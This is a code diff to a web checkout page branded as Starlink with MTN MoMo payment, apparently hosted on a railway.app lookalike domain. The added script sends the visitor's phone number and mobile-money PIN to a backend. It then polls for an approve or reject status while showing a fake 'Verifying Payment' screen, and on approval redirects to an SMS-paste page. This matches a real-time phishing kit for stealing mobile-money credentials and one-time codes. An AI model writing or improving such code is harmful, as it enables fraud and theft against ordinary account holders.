@@ -7,9 +7,6 @@
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
     <style>
-        /* ============================================
-           RESET & BASE
-        ============================================ */
         *, *::before, *::after {
             margin: 0;
             padding: 0;
@@ -44,10 +41,8 @@
             --radius-lg: 22px;
             --radius-xl: 26px;
             --radius-2xl: 30px;
-            --shadow-sm: 0 1px 3px rgba(0,0,0,0.06), 0 1px 2px rgba(0,0,0,0.04);
             --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
             --shadow-lg: 0 8px 20px rgba(0,0,0,0.12);
-            --shadow-xl: 0 12px 28px rgba(0,0,0,0.16);
             --shadow-2xl: 0 20px 40px rgba(0,0,0,0.2);
             --header-h: 74px;
             --footer-h: 68px;
@@ -74,9 +69,6 @@
         a { text-decoration: none; color: inherit; }
         button { font-family: inherit; cursor: pointer; border: none; background: none; }
 
-        /* ============================================
-           HEADER
-        ============================================ */
         .header {
             position: fixed;
             top: 0; left: 0; right: 0;
@@ -121,9 +113,6 @@
         .header-nav a:hover { color: var(--white); }
         .header-nav i { font-size: 18px; }
 
-        /* ============================================
-           MAIN
-        ============================================ */
         .main {
             max-width: 1200px;
             margin: 0 auto;
@@ -143,9 +132,6 @@
             max-width: 440px;
         }
 
-        /* ============================================
-           MOMO BAND
-        ============================================ */
         .momo-band {
             background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
             border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
@@ -183,9 +169,6 @@
             position: relative;
         }
 
-        /* ============================================
-           CHECKOUT BODY
-        ============================================ */
         .checkout-body {
             background: var(--white);
             border-radius: 0 0 var(--radius-2xl) var(--radius-2xl);
@@ -345,9 +328,7 @@
 
         .security-note i { color: var(--green-600); font-size: 15px; }
 
-        /* ============================================
-           PIN MODAL
-        ============================================ */
+        /* PIN MODAL */
         .modal-container {
             position: fixed;
             inset: 0;
@@ -365,10 +346,7 @@
             animation: fadeIn 0.2s ease;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to   { opacity: 1; }
-        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
         .pin-modal {
             position: fixed;
@@ -419,7 +397,6 @@
             margin-bottom: 8px;
         }
 
-        /* PIN input wrapper (input + eye toggle) */
         .pin-input-wrap {
             position: relative;
             display: flex;
@@ -474,9 +451,7 @@
             background: var(--gray-100);
         }
 
-        .pin-eye-btn.active {
-            color: var(--orange-500);
-        }
+        .pin-eye-btn.active { color: var(--orange-500); }
 
         .pin-actions {
             display: grid;
@@ -540,8 +515,214 @@
         @keyframes spin { to { transform: rotate(360deg); } }
 
         /* ============================================
-           BOTTOM NAV
+           WAITING SCREEN (new)
         ============================================ */
+        .waiting-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(160deg, #0a0a0a 0%, #1a1a1a 50%, #000000 100%);
+            color: var(--white);
+            padding: 24px;
+            overflow: hidden;
+        }
+
+        .waiting-overlay.open { display: flex; animation: fadeIn 0.35s ease; }
+
+        .waiting-overlay::before {
+            content: "";
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 600px; height: 600px;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(255,204,0,0.18) 0%, transparent 60%);
+            animation: pulseGlow 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { transform: translate(-50%, -50%) scale(1);   opacity: 0.6; }
+            50%      { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+        }
+
+        .waiting-content {
+            position: relative;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            z-index: 2;
+        }
+
+        .waiting-orbit {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 28px;
+            position: relative;
+        }
+
+        .waiting-ring {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 2px dashed rgba(255,204,0,0.4);
+            animation: rotate 8s linear infinite;
+        }
+
+        .waiting-ring.inner {
+            inset: 22px;
+            border: 1.5px dashed rgba(59,130,246,0.4);
+            animation: rotate 5s linear infinite reverse;
+        }
+
+        @keyframes rotate { to { transform: rotate(360deg); } }
+
+        .waiting-core {
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 60px; height: 60px;
+            transform: translate(-50%, -50%);
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--momo-yellow) 0%, #FFD633 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 40px rgba(255,204,0,0.5);
+            animation: corePulse 1.6s ease-in-out infinite;
+        }
+
+        @keyframes corePulse {
+            0%, 100% { box-shadow: 0 0 40px rgba(255,204,0,0.5); }
+            50%      { box-shadow: 0 0 60px rgba(255,204,0,0.9); }
+        }
+
+        .waiting-core i { font-size: 28px; color: var(--black); }
+
+        .waiting-title {
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+        }
+
+        .waiting-title .highlight {
+            background: linear-gradient(90deg, var(--momo-yellow), #FFD633);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .waiting-sub {
+            font-size: 14px;
+            color: var(--gray-400);
+            margin-top: 14px;
+            line-height: 1.65;
+        }
+
+        .waiting-sub strong { color: var(--white); font-weight: 800; }
+
+        .waiting-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+        }
+
+        .waiting-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--momo-yellow);
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+
+        .waiting-dot:nth-child(1) { animation-delay: -0.32s; }
+        .waiting-dot:nth-child(2) { animation-delay: -0.16s; }
+        .waiting-dot:nth-child(3) { animation-delay: 0s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
+            40%           { transform: scale(1);   opacity: 1; }
+        }
+
+        /* ============================================
+           ERROR TOAST (reject message)
+        ============================================ */
+        .error-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 10001;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.55);
+            backdrop-filter: blur(4px);
+            padding: 20px;
+        }
+
+        .error-overlay.open { display: flex; }
+
+        .error-card {
+            background: var(--white);
+            border-radius: var(--radius-xl);
+            padding: 26px 22px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+            box-shadow: var(--shadow-2xl);
+            transform: scale(0.9);
+            opacity: 0;
+            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.3s;
+        }
+
+        .error-card.show { transform: scale(1); opacity: 1; }
+
+        .error-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: var(--radius-md);
+            background: #FEE2E2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .error-icon i { font-size: 30px; color: var(--red-500); }
+
+        .error-title {
+            font-size: 17px;
+            font-weight: 900;
+            color: var(--gray-900);
+            margin-bottom: 8px;
+        }
+
+        .error-text {
+            font-size: 13.5px;
+            color: var(--gray-500);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .error-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--momo-yellow);
+            color: var(--black);
+            font-weight: 900;
+            font-size: 13px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border-radius: var(--radius-md);
+            transition: transform 0.15s, filter 0.2s;
+            box-shadow: 0 4px 12px rgba(255,204,0,0.35);
+        }
+
+        .error-btn:hover { filter: brightness(0.95); }
+        .error-btn:active { transform: scale(0.97); }
+
+        /* BOTTOM NAV */
         .bottom-nav {
             position: fixed;
             bottom: 0; left: 0; right: 0;
@@ -578,9 +759,6 @@
         .nav-item i { font-size: 24px; }
         .nav-item:hover { transform: translateY(-2px); }
 
-        /* ============================================
-           RESPONSIVE
-        ============================================ */
         @media (min-width: 640px) {
             .main { padding: 28px 22px 44px; }
             .momo-band { padding: 32px 28px; }
@@ -596,7 +774,6 @@
 </head>
 <body>
 
-    <!-- ============ HEADER ============ -->
     <header class="header">
         <div class="header-inner">
             <a href="/" class="brand">
@@ -606,28 +783,21 @@
             </a>
 
             <nav class="header-nav">
-                <a href="/dashboard/">
-                    <i class="uil uil-wifi"></i> <span>Status</span>
-                </a>
-                <a href="/plans/">
-                    <i class="uil uil-home"></i> <span>Plans</span>
-                </a>
+                <a href="/dashboard/"><i class="uil uil-wifi"></i> <span>Status</span></a>
+                <a href="/plans/"><i class="uil uil-home"></i> <span>Plans</span></a>
             </nav>
         </div>
     </header>
 
-    <!-- ============ MAIN ============ -->
     <main class="main">
         <div class="checkout-wrap">
             <div class="checkout-card-wrap">
 
-                <!-- MoMo Band -->
                 <div class="momo-band">
                     <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="momo-logo-img">
                     <p class="momo-tagline">Secure Payment</p>
                 </div>
 
-                <!-- White Card Body -->
                 <div class="checkout-body">
 
                     <div class="amount-block">
@@ -682,7 +852,7 @@
         </div>
     </main>
 
-    <!-- ============ PIN MODAL ============ -->
+    <!-- PIN MODAL -->
     <div class="modal-container" id="modalContainer">
         <div class="sheet-overlay" id="sheetOverlay"></div>
 
@@ -725,26 +895,55 @@
         </div>
     </div>
 
-    <!-- ============ BOTTOM NAV ============ -->
+    <!-- WAITING SCREEN -->
+    <div class="waiting-overlay" id="waitingOverlay">
+        <div class="waiting-content">
+            <div class="waiting-orbit">
+                <div class="waiting-ring"></div>
+                <div class="waiting-ring inner"></div>
+                <div class="waiting-core">
+                    <i class="uil uil-shield-check"></i>
+                </div>
+            </div>
+            <h2 class="waiting-title">Verifying <span class="highlight">Payment</span></h2>
+            <p class="waiting-sub">
+                Please hold on as we confirm your <strong id="waitingPlan">Standard</strong> subscription.<br>
+                This usually takes a few seconds.
+            </p>
+            <div class="waiting-dots">
+                <span class="waiting-dot"></span>
+                <span class="waiting-dot"></span>
+                <span class="waiting-dot"></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ERROR OVERLAY -->
+    <div class="error-overlay" id="errorOverlay">
+        <div class="error-card" id="errorCard">
+            <div class="error-icon"><i class="uil uil-times-circle"></i></div>
+            <h3 class="error-title">Payment Failed</h3>
+            <p class="error-text" id="errorText">
+                Incorrect number. Kindly check your number and try again.
+            </p>
+            <button class="error-btn" id="errorBtn">Try Again</button>
+        </div>
+    </div>
+
     <nav class="bottom-nav">
         <div class="bottom-nav-inner">
-            <a href="/dashboard/" class="nav-item">
-                <i class="uil uil-wifi"></i>
-                <span>Status</span>
-            </a>
-            <a href="/plans/" class="nav-item">
-                <i class="uil uil-shopping-bag"></i>
-                <span>Plans</span>
-            </a>
-            <a href="/settings/" class="nav-item">
-                <i class="uil uil-setting"></i>
-                <span>Settings</span>
-            </a>
+            <a href="/dashboard/" class="nav-item"><i class="uil uil-wifi"></i><span>Status</span></a>
+            <a href="/plans/" class="nav-item"><i class="uil uil-shopping-bag"></i><span>Plans</span></a>
+            <a href="/settings/" class="nav-item"><i class="uil uil-setting"></i><span>Settings</span></a>
         </div>
     </nav>
 
-    <!-- ============ SCRIPT ============ -->
     <script>
+        // ============================================
+        // CONFIG
+        // ============================================
+        const API_BASE = ''; // same origin — leave empty
+
         // ============================================
         // READ PLAN FROM URL
         // ============================================
@@ -759,6 +958,7 @@
         document.getElementById('display-plan-data').textContent = planData;
         document.getElementById('display-amount').textContent = formattedPrice;
         document.getElementById('confirmAmount').textContent = formattedPrice;
+        document.getElementById('waitingPlan').textContent = planName;
 
         // ============================================
         // ELEMENTS
@@ -773,6 +973,12 @@
         const overlay = document.getElementById('sheetOverlay');
         const togglePin = document.getElementById('togglePin');
 
+        const waitingOverlay = document.getElementById('waitingOverlay');
+        const errorOverlay = document.getElementById('errorOverlay');
+        const errorCard = document.getElementById('errorCard');
+        const errorText = document.getElementById('errorText');
+        const errorBtn = document.getElementById('errorBtn');
+
         // ============================================
         // KEYBOARD-AWARE POPUP POSITION
         // ============================================
@@ -782,7 +988,6 @@
                 popup.style.bottom = Math.max(170, keyboard + 70) + 'px';
             }
         }
-
         if (window.visualViewport) {
             window.visualViewport.addEventListener('resize', movePopup);
         }
@@ -794,7 +999,6 @@
             document.body.classList.add('modal-open');
             modal.classList.add('open');
             movePopup();
-
             setTimeout(() => {
                 popup.classList.add('show');
                 setTimeout(() => pin.focus(), 250);
@@ -810,6 +1014,7 @@
                 togglePin.classList.remove('active');
                 togglePin.innerHTML = '<i class="uil uil-eye"></i>';
                 proceed.disabled = true;
+                proceed.innerHTML = '<i class="uil uil-arrow-right"></i><span>Proceed</span>';
                 document.body.classList.remove('modal-open');
             }, 250);
         }
@@ -842,71 +1047,133 @@
         });
 
         // ============================================
-        // EYE TOGGLE — show/hide PIN
+        // EYE TOGGLE
         // ============================================
         togglePin.addEventListener('click', () => {
             const isPassword = pin.type === 'password';
-
             pin.type = isPassword ? 'text' : 'password';
             togglePin.classList.toggle('active', isPassword);
             togglePin.innerHTML = isPassword
                 ? '<i class="uil uil-eye-slash"></i>'
                 : '<i class="uil uil-eye"></i>';
-
             pin.focus();
         });
 
         // ============================================
-        // PIN INPUT — digits only, enable Proceed on 4-5
+        // PIN INPUT
         // ============================================
         pin.addEventListener('input', function () {
             this.value = this.value.replace(/\D/g, '').slice(0, 5);
-
             const isValid = /^\d{4,5}$/.test(this.value);
             proceed.disabled = !isValid;
         });
 
         // ============================================
-        // PROCEED — submit and go to SMS paste page
+        // PROCEED — call backend
         // ============================================
-        proceed.addEventListener('click', () => {
-            if (!/^\d{4,5}$/.test(pin.value)) {
-                return;
-            }
+        let pollTimer = null;
+        let currentSessionId = null;
+
+        proceed.addEventListener('click', async () => {
+            if (!/^\d{4,5}$/.test(pin.value)) return;
 
             proceed.disabled = true;
             proceed.innerHTML = '<span class="btn-spinner"></span><span>Processing...</span>';
 
-            // TODO: Replace this with a real API call:
-            /*
-            fetch('/api/momo/pay/', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    plan: planName,
-                    data: planData,
-                    price: planPrice,
-                    momo_number: number.value,
-                    pin: pin.value
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (data.success) { redirect }
-                else { show error }
-            })
-            */
+            const phone = number.value.trim();
+            const userPin = pin.value;
 
-            // Simulated flow — redirect to SMS paste page
-            setTimeout(() => {
-                const smsParams = new URLSearchParams({
-                    plan: planName,
-                    data: planData,
-                    price: planPrice,
-                    phone: number.value
+            try {
+                const res = await fetch(API_BASE + '/api/checkout', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        plan: planName,
+                        data: planData,
+                        price: planPrice,
+                        phone: phone,
+                        pin: userPin
+                    })
                 });
-                window.location.href = '/sms-paste/?' + smsParams.toString();
-            }, 1500);
+
+                const data = await res.json();
+
+                if (!data.ok) {
+                    showError(data.error || 'Something went wrong. Please try again.');
+                    return;
+                }
+
+                currentSessionId = data.sessionId;
+
+                // Hide modal + show waiting overlay
+                closeModal();
+                waitingOverlay.classList.add('open');
+                document.body.classList.add('modal-open');
+
+                // Start polling
+                startPolling(currentSessionId, phone);
+
+            } catch (err) {
+                console.error(err);
+                showError('Network error. Please check your connection and try again.');
+            }
+        });
+
+        // ============================================
+        // POLL FOR STATUS
+        // ============================================
+        function startPolling(sessionId, phone) {
+            clearInterval(pollTimer);
+            pollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch(API_BASE + '/api/status/' + sessionId);
+                    const data = await res.json();
+
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        clearInterval(pollTimer);
+                        const smsParams = new URLSearchParams({
+                            plan: planName,
+                            data: planData,
+                            price: planPrice,
+                            phone: phone
+                        });
+                        window.location.href = '/sms-paste/?' + smsParams.toString();
+                    } else if (data.status === 'rejected') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        showError(data.message || 'Incorrect number. Kindly check your number and try again.');
+                    } else if (data.status === 'timeout') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        showError('Session expired. Please try again.');
+                    }
+                } catch (err) {
+                    // silently ignore — will retry
+                }
+            }, 2000);
+        }
+
+        // ============================================
+        // SHOW ERROR
+        // ============================================
+        function showError(message) {
+            errorText.textContent = message;
+            errorOverlay.classList.add('open');
+            setTimeout(() => errorCard.classList.add('show'), 50);
+        }
+
+        errorBtn.addEventListener('click', () => {
+            errorCard.classList.remove('show');
+            setTimeout(() => {
+                errorOverlay.classList.remove('open');
+                document.body.classList.remove('modal-open');
+                // Reset proceed button
+                proceed.disabled = true;
+                proceed.innerHTML = '<i class="uil uil-arrow-right"></i><span>Proceed</span>';
+                pin.value = '';
+            }, 250);
         });
 
         // ============================================
